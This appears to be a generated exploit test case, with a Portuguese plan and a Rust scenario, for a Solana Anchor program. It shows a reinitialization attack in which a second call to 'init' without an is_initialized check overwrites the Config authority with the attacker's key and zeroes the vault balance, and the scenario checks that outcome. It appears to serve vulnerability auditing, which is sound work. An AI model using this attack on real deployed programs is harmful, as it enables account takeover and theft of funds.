{
  "plan": "Preparamos uma conta Config já inicializada com authority = vítima e vault_balance = 1000, usando o baseline legítimo da instrução `init` (que sobrescreve com o authority do chamador e zera o saldo). Em seguida, o ataque chama a mesma instrução `init` passando a conta Config resultante do baseline e a conta do atacante como authority signer. Como não há checagem de is_initialized, o handler sobrescreve config.authority com a chave do atacante e zera vault_balance. Medimos o dano verificando que, após o ataque, o authority gravado na conta é o do atacante e o vault_balance foi zerado, estado que o uso legítimo não produziria sobre uma conta já inicializada.",
  "scenario": "let attacker = Pubkey::new_unique();
let victim = Pubkey::new_unique();

// Conta Config já inicializada com authority da vítima e saldo 1000
let config_data = anchor_account_data(
    "Config",
    &(victim, true, 1000u64),
);
let config_key = Pubkey::new_unique();
let config_account = account(&env.program_id, &config_data, None);

// Baseline: uso legítimo da instrução init com a conta já existente
let ix_baseline = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new(victim, true),
    ],
);
let contas_baseline = vec![
    (config_key, config_account.clone()),
    (victim, wallet(1_000_000_000)),
];
let r_base = env.baseline("init legitimo", &ix_baseline, &contas_baseline);

// Estado após o baseline: authority = victim, is_initialized = true, vault_balance = 0
let config_pos_baseline = after(&r_base, &config_key).clone();

// Ataque: mesma instrução init, mas com o atacante como authority
let ix_attack = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new(attacker, true),
    ],
);
let contas_attack = vec![
    (config_key, config_pos_baseline),
    (attacker, wallet(1_000_000_000)),
];
let r = env.attack("reinit sobrescreve authority", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &config_key).data();
    let authority_pos = read_pubkey(data, 8);
    let balance_pos = read_u64(data, 8 + 32 + 1);
    env.effect(
        "authority sobrescrito pelo atacante",
        authority_pos == attacker,
    );
    env.effect(
        "vault_balance zerado pelo ataque",
        balance_pos == 0,
    );
}"
}

